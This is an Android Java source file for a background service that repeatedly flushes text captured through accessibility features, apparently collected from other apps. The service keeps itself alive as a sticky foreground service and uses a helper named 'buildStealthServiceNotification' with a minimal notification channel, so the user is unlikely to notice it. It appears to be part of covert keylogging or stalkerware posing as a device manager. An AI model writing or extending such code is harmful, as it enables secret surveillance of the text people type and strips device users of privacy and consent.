package com.company.devicemgr.services;

import android.app.Notification;
import android.app.Service;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;

import com.company.devicemgr.utils.ForegroundNotificationHelper;
import com.company.devicemgr.utils.InAppTextCaptureManager;

public class InAppTextCaptureService extends Service {
    private static final String CHANNEL_ID = "devicemgr_in_app_text_capture";
    private static final int NOTIFICATION_ID = 3207;
    private static final long FLUSH_INTERVAL_MS = 60_000L;

    private final Handler handler = new Handler(Looper.getMainLooper());
    private final Runnable flushRunnable = new Runnable() {
        @Override
        public void run() {
            if (!InAppTextCaptureManager.isCaptureEnabled(InAppTextCaptureService.this)) {
                stopSelf();
                return;
            }
            InAppTextCaptureManager.flushPendingAsync(getApplicationContext());
            startForeground(NOTIFICATION_ID, buildNotification());
            handler.postDelayed(this, FLUSH_INTERVAL_MS);
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, buildNotification());
        handler.post(flushRunnable);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (!InAppTextCaptureManager.isCaptureEnabled(this)) {
            stopSelf();
            return START_NOT_STICKY;
        }
        startForeground(NOTIFICATION_ID, buildNotification());
        InAppTextCaptureManager.flushPendingAsync(getApplicationContext());
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        handler.removeCallbacksAndMessages(null);
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private Notification buildNotification() {
        return ForegroundNotificationHelper.buildStealthServiceNotification(
                this,
                CHANNEL_ID,
                android.R.drawable.ic_menu_edit
        );
    }

    private void createNotificationChannel() {
        ForegroundNotificationHelper.ensureMinChannel(this, CHANNEL_ID, "Captura de texto por acessibilidade");
    }
}
